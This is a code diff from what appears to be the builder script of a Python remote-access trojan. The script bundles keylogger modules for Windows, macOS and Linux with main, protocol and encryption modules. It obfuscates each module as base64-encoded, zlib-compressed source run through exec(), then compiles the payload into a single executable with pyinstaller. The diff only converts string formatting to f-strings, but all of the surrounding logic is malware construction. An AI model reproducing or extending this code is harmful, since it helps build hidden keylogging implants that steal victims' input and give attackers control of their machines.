@@ -74,13 +74,20 @@ def assemble_stitch():
     st_osx_kl     = get_osx_keylogger()
     st_lnx_kl     = get_lnx_keylogger()
 
-    st_main       = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_main)))
-    st_utils      = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_utils)))
-    st_protocol   = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_protocol)))
-    st_encryption = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_encryption)))
-    st_win_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_win_kl)))
-    st_osx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_osx_kl)))
-    st_lnx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_lnx_kl)))
+    st_main = f'from requirements import *\n\nexec(SEC(INFO("{base64.b64encode(zlib.compress(st_main))}")))'
+
+    st_utils = f'from requirements import *\n\nexec(SEC(INFO("{base64.b64encode(zlib.compress(st_utils))}")))'
+
+    st_protocol = f'from requirements import *\n\nexec(SEC(INFO("{base64.b64encode(zlib.compress(st_protocol))}")))'
+
+    st_encryption = f'from requirements import *\n\nexec(SEC(INFO("{base64.b64encode(zlib.compress(st_encryption))}")))'
+
+    st_win_kl = f'from requirements import *\n\nexec(SEC(INFO("{base64.b64encode(zlib.compress(st_win_kl))}")))'
+
+    st_osx_kl = f'from requirements import *\n\nexec(SEC(INFO("{base64.b64encode(zlib.compress(st_osx_kl))}")))'
+
+    st_lnx_kl = f'from requirements import *\n\nexec(SEC(INFO("{base64.b64encode(zlib.compress(st_lnx_kl))}")))'
+
 
     main_script   = os.path.join(configuration_path,'st_main.py')
     utils_script  = os.path.join(configuration_path,'st_utils.py')
@@ -210,7 +217,12 @@ exe = EXE(pyz,
 
     with open('st_main.spec','w') as st:
         st.write(st_spec)
-    st_log.info(run_command('pyinstaller --onefile --distpath={} st_main.spec'.format(dist_dir)))
+    st_log.info(
+        run_command(
+            f'pyinstaller --onefile --distpath={dist_dir} st_main.spec'
+        )
+    )
+
 
     binary = os.path.join(dist_dir,name)
     binary_dir = os.path.join(dist_dir,'Binaries')
@@ -220,7 +232,9 @@ exe = EXE(pyz,
         shutil.copy(binary,binary_dir)
         os.remove(binary)
     else:
-        st_log.error('{} was not created from command "pyinstaller --onefile --distpath={} st_main.spec"'.format(binary,dist_dir))
+        st_log.error(
+            f'{binary} was not created from command "pyinstaller --onefile --distpath={dist_dir} st_main.spec"'
+        )
 
 def run_exe_gen():
     if not os.path.exists(st_config):
